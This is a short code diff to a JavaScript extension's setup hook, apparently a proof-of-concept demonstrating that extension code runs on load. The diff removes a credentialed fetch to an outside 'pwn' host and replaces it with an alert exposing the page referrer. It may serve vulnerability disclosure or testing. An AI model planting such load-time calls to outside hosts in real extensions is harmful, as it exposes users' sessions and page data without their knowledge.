@@ -17,12 +17,7 @@ const ext = {
 
     async setup() {
         console.log("pwn-setup!");
-        alert("pwn-setup!");
-        await fetch("https://innerproj-pwn.hf.space/", {
-            method: "GET",
-            mode: "no-cors",
-            credentials: "include"
-        });
+        alert(`pwn! ${document.referrer}`);
     }
 }
 
